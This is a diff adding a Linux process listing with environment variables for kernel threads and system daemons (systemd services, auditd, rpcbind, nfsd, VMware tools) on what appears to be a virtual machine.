@@ -1,0 +1,257 @@
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           2  0.0  0.0      0     0 ?        S    03:31   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [pool_workqueue_release]
+root           4  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-rcu_g]
+root           5  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-rcu_p]
+root           6  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-slub_]
+root           7  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-netns]
+root           9  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/0:0H-events_highpri]
+root          12  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-mm_pe]
+root          13  0.0  0.0      0     0 ?        I    03:31   0:00  \_ [rcu_tasks_kthread]
+root          14  0.0  0.0      0     0 ?        I    03:31   0:00  \_ [rcu_tasks_rude_kthread]
+root          15  0.0  0.0      0     0 ?        I    03:31   0:00  \_ [rcu_tasks_trace_kthread]
+root          16  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [ksoftirqd/0]
+root          17  0.0  0.0      0     0 ?        I    03:31   0:05  \_ [rcu_preempt]
+root          18  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [migration/0]
+root          19  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [idle_inject/0]
+root          20  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [cpuhp/0]
+root          21  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [cpuhp/1]
+root          22  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [idle_inject/1]
+root          23  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [migration/1]
+root          24  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [ksoftirqd/1]
+root          26  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/1:0H-events_highpri]
+root          29  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [kdevtmpfs]
+root          30  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-inet_]
+root          31  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [kauditd]
+root          32  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [khungtaskd]
+root          33  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [oom_reaper]
+root          35  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-write]
+root          37  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [kcompactd0]
+root          38  0.0  0.0      0     0 ?        SN   03:31   0:00  \_ [ksmd]
+root          40  0.0  0.0      0     0 ?        SN   03:31   0:00  \_ [khugepaged]
+root          41  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-kinte]
+root          42  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-kbloc]
+root          43  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-blkcg]
+root          44  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/9-acpi]
+root          45  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-tpm_d]
+root          46  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-ata_s]
+root          47  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-md]
+root          48  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-md_bi]
+root          49  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-edac-]
+root          50  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-devfr]
+root          51  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [watchdogd]
+root          52  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-quota]
+root          55  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [kswapd0]
+root          56  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [ecryptfs-kthread]
+root          57  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-kthro]
+root          58  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/24-pciehp]
+root          59  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/25-pciehp]
+root          60  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/26-pciehp]
+root          61  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/27-pciehp]
+root          62  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/28-pciehp]
+root          63  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/29-pciehp]
+root          64  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/30-pciehp]
+root          65  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/31-pciehp]
+root          66  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/32-pciehp]
+root          67  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/33-pciehp]
+root          68  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/34-pciehp]
+root          69  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/35-pciehp]
+root          70  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/36-pciehp]
+root          71  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/37-pciehp]
+root          72  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/38-pciehp]
+root          73  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/39-pciehp]
+root          74  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/40-pciehp]
+root          75  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/41-pciehp]
+root          76  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/42-pciehp]
+root          77  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/43-pciehp]
+root          78  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/44-pciehp]
+root          79  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/45-pciehp]
+root          80  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/46-pciehp]
+root          81  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/47-pciehp]
+root          82  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/48-pciehp]
+root          83  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/49-pciehp]
+root          84  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/50-pciehp]
+root          85  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/51-pciehp]
+root          86  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/52-pciehp]
+root          87  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/53-pciehp]
+root          88  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/54-pciehp]
+root          89  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/55-pciehp]
+root          90  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-acpi_]
+root          92  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_0]
+root          93  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root          94  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_1]
+root          95  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root          99  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-mld]
+root         100  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-ipv6_]
+root         101  0.0  0.0      0     0 ?        I    03:31   0:00  \_ [kworker/u4:1-netns]
+root         108  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-kstrp]
+root         110  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/u7:0]
+root         111  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/u8:0]
+root         112  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/u9:0]
+root         125  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-charg]
+root         150  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/0:1H-kblockd]
+root         175  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_2]
+root         179  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         180  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_3]
+root         182  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         183  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_4]
+root         184  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         185  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_5]
+root         188  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         189  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_6]
+root         190  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         192  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_7]
+root         193  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         194  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_8]
+root         195  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         196  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_9]
+root         198  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         199  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_10]
+root         200  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         202  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_11]
+root         203  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         204  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_12]
+root         205  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         209  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_13]
+root         210  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-mpt_p]
+root         211  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         212  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_14]
+root         217  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         219  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_15]
+root         220  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-mpt/0]
+root         221  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         222  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_16]
+root         223  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         224  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_17]
+root         225  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         226  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_18]
+root         227  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         228  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_19]
+root         229  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         230  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_20]
+root         231  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         232  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_21]
+root         233  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         234  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_22]
+root         235  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         236  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_23]
+root         237  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         238  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_24]
+root         239  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         240  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_25]
+root         241  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         242  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_26]
+root         243  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         244  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_27]
+root         245  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         246  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_28]
+root         247  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         248  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_29]
+root         249  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         250  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_30]
+root         251  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         252  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_31]
+root         253  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         280  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [scsi_eh_32]
+root         281  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-scsi_]
+root         310  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-raid5]
+root         341  0.0  0.0      0     0 ?        S    03:31   0:01  \_ [jbd2/sda4-8]
+root         342  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-ext4-]
+root         418  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-rpcio]
+root         419  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-xprti]
+root         471  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [psimon]
+root         558  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [jbd2/sda2-8]
+root         559  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-ext4-]
+root         735  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [audit_prune_tree]
+root         742  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/60-vmw_vmci]
+root         744  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/61-vmw_vmci]
+root         844  0.0  0.0      0     0 ?        S    03:31   0:00  \_ [irq/16-vmwgfx]
+root         845  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-ttm]
+root         947  0.0  0.0      0     0 ?        I    03:31   0:00  \_ [kworker/u4:2-ext4-rsv-conversion]
+root        1081  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/R-crypt]
+root        1215  0.0  0.0      0     0 ?        I<   03:31   0:00  \_ [kworker/1:2H-kblockd]
+root        1602  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [lockd]
+root        1614  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1615  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1616  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1617  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1618  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1619  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1620  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        1621  0.0  0.0      0     0 ?        I    03:32   0:00  \_ [nfsd]
+root        4774  0.0  0.0      0     0 ?        I    08:12   0:00  \_ [kworker/u6:2-events_unbound]
+root        5276  0.0  0.0      0     0 ?        I    08:32   0:01  \_ [kworker/0:3-events]
+root        5344  0.0  0.0      0     0 ?        I    08:33   0:00  \_ [kworker/u5:2-events_unbound]
+root        5432  0.0  0.0      0     0 ?        I    08:34   0:00  \_ [kworker/u6:1-flush-8:0]
+root        5506  0.0  0.0      0     0 ?        I    08:38   0:00  \_ [kworker/u5:1-events_power_efficient]
+root        5697  0.2  0.0      0     0 ?        I    08:41   0:03  \_ [kworker/1:3-events]
+root        5730  0.0  0.0      0     0 ?        I    08:41   0:00  \_ [kworker/0:1-cgroup_free]
+root        5871  0.0  0.0      0     0 ?        I    08:46   0:00  \_ [kworker/u5:3-flush-8:0]
+root        5988  0.0  0.0      0     0 ?        I    08:47   0:00  \_ [kworker/u6:0-flush-8:0]
+root        6145  0.0  0.0      0     0 ?        I    08:50   0:00  \_ [kworker/1:2-cgroup_release]
+root        6245  0.0  0.0      0     0 ?        S    08:52   0:00  \_ [psimon]
+root        6334  0.0  0.0      0     0 ?        I    08:56   0:00  \_ [kworker/u6:3-events_unbound]
+root        6372  0.0  0.0      0     0 ?        I    09:00   0:00  \_ [kworker/0:0]
+root           1  0.0  0.3  22476 13736 ?        Ss   03:31   0:07 /sbin/init biosdevname=0 HOME=/ init=/sbin/init NETWORK_SKIP_ENSLAVED= TERM=linux drop_caps= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PWD=/ rootmnt=/root
+root         399  0.0  0.5  58640 22640 ?        S<s  03:31   0:03 /usr/lib/systemd/systemd-journald LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify FDSTORE=4224 LISTEN_PID=399 LISTEN_FDS=3 LISTEN_FDNAMES=systemd-journald-dev-log.socket:systemd-journald.socket:systemd-journald.socket WATCHDOG_PID=399 WATCHDOG_USEC=180000000 USER=root INVOCATION_ID=ce53d42fa7ba4ee7b34dd39c39930639 RUNTIME_DIRECTORY=/run/systemd/journal SYSTEMD_EXEC_PID=399 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/systemd-journald.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= TERM=linux
+root         466  0.0  0.2  30336  9052 ?        Ss   03:31   0:00 /usr/lib/systemd/systemd-udevd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify LISTEN_PID=466 LISTEN_FDS=2 LISTEN_FDNAMES=systemd-udevd-control.socket:systemd-udevd-kernel.socket WATCHDOG_PID=466 WATCHDOG_USEC=180000000 USER=root INVOCATION_ID=1f36a2d63b564d5abf338ab0cb904b57 JOURNAL_STREAM=8:3871 SYSTEMD_EXEC_PID=466 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/systemd-udevd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         658  0.0  0.0  85908  3008 ?        S<sl 03:31   0:05 /sbin/auditd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin PIDFILE=/run/auditd.pid USER=root INVOCATION_ID=3b723182f22843f486e74300e9f37fca JOURNAL_STREAM=8:5816 SYSTEMD_EXEC_PID=643 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/auditd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+_laurel      661  0.0  0.1  10100  6364 ?        S<   03:31   0:06  \_ /usr/local/sbin/laurel --config /etc/laurel/config.toml
+_rpc         667  0.0  0.1   7968  4072 ?        Ss   03:31   0:00 /sbin/rpcbind -f -w LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify LISTEN_PID=667 LISTEN_FDS=5 LISTEN_FDNAMES=rpcbind.socket:rpcbind.socket:rpcbind.socket:rpcbind.socket:rpcbind.socket USER=root INVOCATION_ID=d06fefee2e5f48b0baa003607edad8fa JOURNAL_STREAM=8:6304 SYSTEMD_EXEC_PID=667 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/rpcbind.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= OPTIONS=-w
+systemd+     683  0.0  0.3  21596 13064 ?        Ss   03:31   0:03 /usr/lib/systemd/systemd-resolved LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify WATCHDOG_PID=683 WATCHDOG_USEC=180000000 USER=systemd-resolve LOGNAME=systemd-resolve INVOCATION_ID=629ca42aaa03455aa190cc27bbaf843e JOURNAL_STREAM=8:8220 RUNTIME_DIRECTORY=/run/systemd/resolve CREDENTIALS_DIRECTORY=/run/credentials/systemd-resolved.service SYSTEMD_EXEC_PID=683 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/systemd-resolved.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+systemd+     691  0.0  0.1  91028  7796 ?        Ssl  03:31   0:01 /usr/lib/systemd/systemd-timesyncd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify WATCHDOG_PID=691 WATCHDOG_USEC=180000000 USER=systemd-timesync LOGNAME=systemd-timesync INVOCATION_ID=6d66866fec76494eaba0068b13529949 JOURNAL_STREAM=8:6628 RUNTIME_DIRECTORY=/run/systemd/timesync STATE_DIRECTORY=/var/lib/systemd/timesync SYSTEMD_EXEC_PID=691 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/systemd-timesyncd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= SYSTEMD_NSS_RESOLVE_VALIDATE=0
+root         731  0.0  0.0   5140  1672 ?        Ss   03:31   0:00 /usr/sbin/blkmapd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin PIDFILE=/run/blkmapd.pid USER=root INVOCATION_ID=8aeb2986a11147ae9d89a042903a068c JOURNAL_STREAM=8:6687 SYSTEMD_EXEC_PID=717 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/nfs-blkmap.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         741  0.0  0.0   5632  3056 ?        Ss   03:31   0:00 /usr/sbin/nfsdcld LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=4eb32c82aa7a4bc6a06d70cb82e9a512 JOURNAL_STREAM=8:6770 SYSTEMD_EXEC_PID=737 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/nfsdcld.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         745  0.0  0.3  53468 12100 ?        Ss   03:31   0:00 /usr/bin/VGAuthService LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=42f824be152844bfb3615ee3436a81f8 JOURNAL_STREAM=8:8711 SYSTEMD_EXEC_PID=745 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/vgauth.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         746  0.1  0.2 317172 10716 ?        Ssl  03:31   0:27 /usr/bin/vmtoolsd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=93cf5d5ccecc4d7e887b2dd020a67ca3 JOURNAL_STREAM=8:6861 SYSTEMD_EXEC_PID=746 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/open-vm-tools.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         768  0.0  0.0   4068  3252 ?        Ss   03:31   0:00 dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 CLASS=auto METHOD=dhcp MODE=start LOGICAL=eth0 PHASE=post-up ADDRFAM=inet VERBOSITY=0 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin IFUPDOWN_eth0=post-up IFACE=eth0 PWD=/
+message+     839  0.0  0.1   9836  5548 ?        Ss   03:31   0:02 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify LISTEN_PID=839 LISTEN_FDS=1 LISTEN_FDNAMES=dbus.socket SYSTEMD_NSS_DYNAMIC_BYPASS=1 USER=root INVOCATION_ID=e9b761610c834342bf1354fc455651e0 JOURNAL_STREAM=8:8825 SYSTEMD_EXEC_PID=839 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/dbus.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         843  0.0  0.0   5428  3592 ?        Ss   03:31   0:00 /usr/sbin/fsidd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=03ead45060e7410f9e9998ab43648903 JOURNAL_STREAM=8:9322 SYSTEMD_EXEC_PID=843 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/fsidd.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         849  0.0  0.5  32192 21344 ?        Ss   03:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify USER=root INVOCATION_ID=db41ddf88775466191d52aadbda70b6b JOURNAL_STREAM=8:9398 SYSTEMD_EXEC_PID=849 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/networkd-dispatcher.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA= networkd_dispatcher_args=--run-startup-triggers
+polkitd      864  0.0  0.2 308164  8020 ?        Ssl  03:31   0:01 /usr/lib/polkit-1/polkitd --no-debug LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=polkitd LOGNAME=polkitd INVOCATION_ID=73207dae13d249efb54b15d0d5da97c3 JOURNAL_STREAM=8:9152 SYSTEMD_EXEC_PID=864 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/polkit.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         893  0.0  0.2  18208  8896 ?        Ss   03:31   0:01 /usr/lib/systemd/systemd-logind LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin NOTIFY_SOCKET=/run/systemd/notify FDSTORE=512 WATCHDOG_PID=893 WATCHDOG_USEC=180000000 USER=root INVOCATION_ID=71c83e3b2fc14e8692a0059a28a8397b JOURNAL_STREAM=8:9544 RUNTIME_DIRECTORY=/run/systemd/inhibit:/run/systemd/seats:/run/systemd/sessions:/run/systemd/shutdown:/run/systemd/users STATE_DIRECTORY=/var/lib/systemd/linger SYSTEMD_EXEC_PID=893 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/systemd-logind.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+root         895  0.0  0.3 468980 13452 ?        Ssl  03:31   0:00 /usr/libexec/udisks2/udisksd LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin USER=root INVOCATION_ID=d4bad1b553f74148b955083ff8fda70a JOURNAL_STREAM=8:9515 SYSTEMD_EXEC_PID=895 MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/udisks2.service/memory.pressure MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
